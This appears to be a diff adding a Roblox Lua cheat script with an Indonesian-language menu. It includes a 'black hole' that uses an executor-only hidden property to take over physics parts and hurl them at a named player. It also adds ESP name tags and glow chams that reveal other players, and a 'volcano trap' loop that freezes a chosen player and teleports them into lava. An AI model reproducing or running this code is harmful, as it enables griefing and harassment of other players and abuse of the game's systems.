+        LocalPlayer.ReplicationFocus = Workspace
+        RunService.Heartbeat:Connect(function()
+            pcall(function()
+                sethiddenproperty(LocalPlayer, "SimulationRadius", math.huge)
+            end)
+            for _, bp in pairs(Network.BaseParts) do
+                if bp and bp:IsDescendantOf(Workspace) then
+                    bp.Velocity = Network.Velocity
+                end
+            end
+        end)
+    end
+    EnablePartControl()
+end
+
+local function ForcePart(v)
+    if v:IsA("BasePart") and not v.Anchored and not v.Parent:FindFirstChildOfClass("Humanoid") and not v.Parent:FindFirstChild("Head") and v.Name ~= "Handle" then
+        for _, x in ipairs(v:GetChildren()) do
+            if x:IsA("BodyMover") or x:IsA("RocketPropulsion") then
+                x:Destroy()
+            end
+        end
+        if v:FindFirstChild("Attachment") then v:FindFirstChild("Attachment"):Destroy() end
+        if v:FindFirstChild("AlignPosition") then v:FindFirstChild("AlignPosition"):Destroy() end
+        if v:FindFirstChild("Torque") then v:FindFirstChild("Torque"):Destroy() end
+        v.CanCollide = false
+        
+        local Torque = Instance.new("Torque", v)
+        Torque.Torque = Vector3.new(100000, 100000, 100000)
+        local AlignPosition = Instance.new("AlignPosition", v)
+        local Attachment2 = Instance.new("Attachment", v)
+        Torque.Attachment0 = Attachment2
+        AlignPosition.MaxForce = math.huge
+        AlignPosition.MaxVelocity = math.huge
+        AlignPosition.Responsiveness = 200
+        AlignPosition.Attachment0 = Attachment2
+        AlignPosition.Attachment1 = Attachment1
+        
+        Network.RetainPart(v)
+    end
+end
+
+local blackHoleActive = false
+local DescendantAddedConnection
+
+local function getPlayerByName(name)
+    local lowerName = string.lower(name)
+    for _, p in pairs(Players:GetPlayers()) do
+        if string.find(string.lower(p.Name), lowerName) or string.find(string.lower(p.DisplayName), lowerName) then
+            return p
+        end
+    end
+end
+
+local function toggleBlackHole()
+    blackHoleActive = not blackHoleActive
+    if blackHoleActive then
+        RusuhExecBtn.Text = "RUSUH ON"
+        RusuhExecBtn.BackgroundColor3 = Color3.fromRGB(20, 130, 70)
+        for _, v in ipairs(Workspace:GetDescendants()) do
+            ForcePart(v)
+        end
+
+        DescendantAddedConnection = Workspace.DescendantAdded:Connect(function(v)
+            if blackHoleActive then
+                ForcePart(v)
+            end
+        end)
+
+        task.spawn(function()
+            while blackHoleActive and RunService.RenderStepped:Wait() do
+                local currentRusuhTarget = _G.RusuhTargetPlayer
+                local char = currentRusuhTarget and currentRusuhTarget.Character
+                local hrp = char and char:FindFirstChild("HumanoidRootPart")
+                if hrp then
+                    Attachment1.WorldCFrame = hrp.CFrame
+                elseif LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                    Attachment1.WorldCFrame = LocalPlayer.Character.HumanoidRootPart.CFrame
+                end
+            end
+        end)
+    else
+        RusuhExecBtn.Text = "RUSUH OFF"
+        RusuhExecBtn.BackgroundColor3 = Color3.fromRGB(20, 80, 150)
+        if DescendantAddedConnection then
+            DescendantAddedConnection:Disconnect()
+        end
+    end
+end
+
+RusuhExecBtn.MouseButton1Click:Connect(function()
+    if RusuhBox.Text ~= "" then
+        local typedTarget = getPlayerByName(RusuhBox.Text)
+        if typedTarget then
+            _G.RusuhTargetPlayer = typedTarget
+            RusuhTargetLabel.Text = "RUSUH TARGET: " .. typedTarget.Name
+            RusuhTargetLabel.TextColor3 = Color3.fromRGB(160, 200, 255)
+        end
+    end
+    
+    if not _G.RusuhTargetPlayer then
+        _G.RusuhTargetPlayer = LocalPlayer
+    end
+    
+    toggleBlackHole()
+end)
+
+
+-- ==================== CONTAINER 3: SETTINGS ====================
+local SettingsContainer = Instance.new("Frame")
+SettingsContainer.Size = UDim2.new(1, 0, 1, -68)
+SettingsContainer.Position = UDim2.new(0, 0, 0, 68)
+SettingsContainer.BackgroundTransparency = 1
+SettingsContainer.Visible = false
+SettingsContainer.ZIndex = 2
+SettingsContainer.Parent = MainFrame
+
+local DaytimeBtn = Instance.new("TextButton")
+DaytimeBtn.Size = UDim2.new(0.92, 0, 0, 36)
+DaytimeBtn.Position = UDim2.new(0.04, 0, 0.05, 0)
+DaytimeBtn.BackgroundColor3 = Color3.fromRGB(20, 25, 35)
+DaytimeBtn.TextColor3 = Color3.fromRGB(100, 200, 255)
+DaytimeBtn.TextSize = 9.5
+DaytimeBtn.Font = Enum.Font.GothamBold
+DaytimeBtn.Text = "☀️ ALWAYS AFTERNOON (LOCKED)"
+DaytimeBtn.ZIndex = 2
+DaytimeBtn.Parent = SettingsContainer
+
+local DayCorner = Instance.new("UICorner")
+DayCorner.CornerRadius = UDim.new(0, 6)
+DayCorner.Parent = DaytimeBtn
+
+Lighting.ClockTime = 14.5
+Lighting.Brightness = 2.5
+Lighting.GlobalShadows = true
+Lighting.OutdoorAmbient = Color3.fromRGB(160, 160, 160)
+Lighting.FogEnd = 100000
+
+RunService.Heartbeat:Connect(function()
+    Lighting.ClockTime = 14.5
+end)
+
+DaytimeBtn.MouseButton1Click:Connect(function()
+    Lighting.ClockTime = 14.5
+    DaytimeBtn.Text = "☀️ ALWAYS AFTERNOON AKTIF & TERKUNCI!"
+    DaytimeBtn.TextColor3 = Color3.fromRGB(0, 255, 0)
+end)
+
+local GlowBtn = Instance.new("TextButton")
+GlowBtn.Size = UDim2.new(0.92, 0, 0, 36)
+GlowBtn.Position = UDim2.new(0.04, 0, 0.22, 0)
+GlowBtn.BackgroundColor3 = Color3.fromRGB(20, 25, 35)
+GlowBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+GlowBtn.TextSize = 9.5
+GlowBtn.Font = Enum.Font.GothamBold
+GlowBtn.Text = "GLOW CHAMS: OFF"
+GlowBtn.ZIndex = 2
+GlowBtn.Parent = SettingsContainer
+
+local GlowCorner = Instance.new("UICorner")
+GlowCorner.CornerRadius = UDim.new(0, 6)
+GlowCorner.Parent = GlowBtn
+
+GlowBtn.MouseButton1Click:Connect(function()
+    glowChamsEnabled = not glowChamsEnabled
+    if glowChamsEnabled then
+        GlowBtn.BackgroundColor3 = Color3.fromRGB(20, 110, 60)
+        GlowBtn.Text = "GLOW CHAMS: ON"
+    else
+        GlowBtn.BackgroundColor3 = Color3.fromRGB(20, 25, 35)
+        GlowBtn.Text = "GLOW CHAMS: OFF"
+    end
+end)
+
+local EspBtn = Instance.new("TextButton")
+EspBtn.Size = UDim2.new(0.92, 0, 0, 36)
+EspBtn.Position = UDim2.new(0.04, 0, 0.39, 0)
+EspBtn.BackgroundColor3 = Color3.fromRGB(20, 25, 35)
+EspBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+EspBtn.TextSize = 9.5
+EspBtn.Font = Enum.Font.GothamBold
+EspBtn.Text = "ESP NAME: OFF"
+EspBtn.ZIndex = 2
+EspBtn.Parent = SettingsContainer
+
+local EspCorner = Instance.new("UICorner")
+EspCorner.CornerRadius = UDim.new(0, 6)
+EspCorner.Parent = EspBtn
+
+EspBtn.MouseButton1Click:Connect(function()
+    espNameEnabled = not espNameEnabled
+    if espNameEnabled then
+        EspBtn.BackgroundColor3 = Color3.fromRGB(20, 110, 60)
+        EspBtn.Text = "ESP NAME: ON"
+    else
+        EspBtn.BackgroundColor3 = Color3.fromRGB(20, 25, 35)
+        EspBtn.Text = "ESP NAME: OFF"
+    end
+end)
+
+
+-- ==================== TAB SWITCHING LOGIC ====================
+Tab1Btn.MouseButton1Click:Connect(function()
+    TrapContainer.Visible = true
+    RusuhContainer.Visible = false
+    SettingsContainer.Visible = false
+    Tab1Btn.BackgroundColor3 = Color3.fromRGB(20, 70, 130); Tab1Btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Tab2Btn.BackgroundColor3 = Color3.fromRGB(20, 25, 35); Tab2Btn.TextColor3 = Color3.fromRGB(160, 180, 200)
+    Tab3Btn.BackgroundColor3 = Color3.fromRGB(20, 25, 35); Tab3Btn.TextColor3 = Color3.fromRGB(160, 180, 200)
+end)
+
+Tab2Btn.MouseButton1Click:Connect(function()
+    TrapContainer.Visible = false
+    RusuhContainer.Visible = true
+    SettingsContainer.Visible = false
+    Tab1Btn.BackgroundColor3 = Color3.fromRGB(20, 25, 35); Tab1Btn.TextColor3 = Color3.fromRGB(160, 180, 200)
+    Tab2Btn.BackgroundColor3 = Color3.fromRGB(20, 70, 130); Tab2Btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Tab3Btn.BackgroundColor3 = Color3.fromRGB(20, 25, 35); Tab3Btn.TextColor3 = Color3.fromRGB(160, 180, 200)
+end)
+
+Tab3Btn.MouseButton1Click:Connect(function()
+    TrapContainer.Visible = false
+    RusuhContainer.Visible = false
+    SettingsContainer.Visible = true
+    Tab1Btn.BackgroundColor3 = Color3.fromRGB(20, 25, 35); Tab1Btn.TextColor3 = Color3.fromRGB(160, 180, 200)
+    Tab2Btn.BackgroundColor3 = Color3.fromRGB(20, 25, 35); Tab2Btn.TextColor3 = Color3.fromRGB(160, 180, 200)
+    Tab3Btn.BackgroundColor3 = Color3.fromRGB(20, 70, 130); Tab3Btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+end)
+
+
+-- ==================== MINIMIZE & OPEN LOGIC ====================
+MinimizeBtn.MouseButton1Click:Connect(function()
+    IsMinimized = true
+    MainFrame.Visible = false
+    OpenButton.Visible = true
+end)
+
+OpenButton.MouseButton1Click:Connect(function()
+    IsMinimized = false
+    MainFrame.Visible = true
+    OpenButton.Visible = false
+end)
+
+
+-- ==================== BACKGROUND RUNSERVICE LOOPS ====================
+RunService.RenderStepped:Connect(function()
+    for _, p in pairs(Players:GetPlayers()) do
+        if p ~= LocalPlayer and p.Character then
+            local char = p.Character
+            local hl = char:FindFirstChild("CiphubGlowChams")
+            if glowChamsEnabled then
+                if not hl then
+                    hl = Instance.new("Highlight")
+                    hl.Name = "CiphubGlowChams"
+                    hl.FillColor = Color3.fromRGB(40, 130, 255)
+                    hl.OutlineColor = Color3.fromRGB(255, 255, 255)
+                    hl.FillTransparency = 0.5
+                    hl.Parent = char
+                end
+            else
+                if hl then hl:Destroy() end
+            end
+
+            local head = char:FindFirstChild("Head")
+            if head then
+                local bill = head:FindFirstChild("CiphubEspName")
+                if espNameEnabled then
+                    if not bill then
+                        bill = Instance.new("BillboardGui")
+                        bill.Name = "CiphubEspName"
+                        bill.Size = UDim2.new(0, 100, 0, 40)
+                        bill.StudsOffset = Vector3.new(0, 2.5, 0)
+                        bill.AlwaysOnTop = true
+                        
+                        local lbl = Instance.new("TextLabel")
+                        lbl.Size = UDim2.new(1, 0, 1, 0)
+                        lbl.BackgroundTransparency = 1
+                        lbl.TextColor3 = Color3.fromRGB(40, 200, 255)
+                        lbl.TextSize = 10
+                        lbl.Font = Enum.Font.GothamBold
+                        lbl.Text = p.Name
+                        lbl.TextStrokeTransparency = 0.5
+                        lbl.Parent = bill
+                        
+                        bill.Parent = head
+                    end
+                else
+                    if bill then bill:Destroy() end
+                end
+            end
+        end
+    end
+end)
+
+-- Loop Utama Volcano Trap Execution
+task.spawn(function()
+    while true do
+        task.wait(0.1)
+        if isRunning and selectedTarget and selectedTarget.Parent then
+            local targetChar = selectedTarget.Character
+            local myChar = LocalPlayer.Character
+            
+            if targetChar and myChar then
+                local targetHumRoot = targetChar:FindFirstChild("HumanoidRootPart")
+                local targetHumanoid = targetChar:FindFirstChild("Humanoid")
+                local myHumRoot = myChar:FindFirstChild("HumanoidRootPart")
+                local myHumanoid = myChar:FindFirstChild("Humanoid")
+
+                if targetHumRoot and targetHumanoid and targetHumanoid.Health > 0 and myHumRoot and myHumanoid then
+                    if not SafePosition then
+                        SafePosition = myHumRoot.CFrame
+                    end
+
+                    myHumanoid.Sit = false
+                    task.wait(0.02)
+                    myHumRoot.CFrame = SafePosition
+
+                    targetHumanoid.WalkSpeed = 0
+                    targetHumanoid.JumpPower = 0
+
+                    targetHumRoot.CFrame = myHumRoot.CFrame * CFrame.new(3, 0, 0)
+                    task.wait(0.05)
+                    
+                    targetHumRoot.CFrame = CFrame.new(VolcanoPosition)
+                    
+                    task.wait(0.1)
+                    targetHumanoid.Sit = false
+                    
+                    for _, v in pairs(targetChar:GetDescendants()) do
+                        if v:IsA("Weld") or v:IsA("Motor6D") then
+                            if (v.Part0 and (v.Part0.Name:lower():find("seat") or v.Part0:IsA("Seat") or v.Part0:IsA("VehicleSeat"))) or 
+                               (v.Part1 and (v.Part1.Name:lower():find("seat") or v.Part1:IsA("Seat") or v.Part1:IsA("VehicleSeat"))) then
+                                v:Destroy()
+                            end
+                        end
+                    end
+                    
+                    for _, obj in pairs(Workspace:GetDescendants()) do
+                        if obj:IsA("Seat") or obj:IsA("VehicleSeat") then
+                            if (obj.Position - VolcanoPosition).Magnitude < 60 then
+                                obj.Disabled = true
+                                obj:Sit(nil)
+                            end
+                        end
+                    end
+
+                    if SafePosition then
+                        myHumRoot.CFrame = SafePosition
+                    end
+                    
+                    isRunning = false
+                    ToggleButton.BackgroundColor3 = Color3.fromRGB(80, 20, 40)
+                    ToggleButton.Text = "OFF"
+                    TargetLabel.Text = "TARGET: " .. selectedTarget.Name .. " (Hangus di Volcano!)"
+                    TargetLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
+                end
+            end
+        end
+    end
+end)
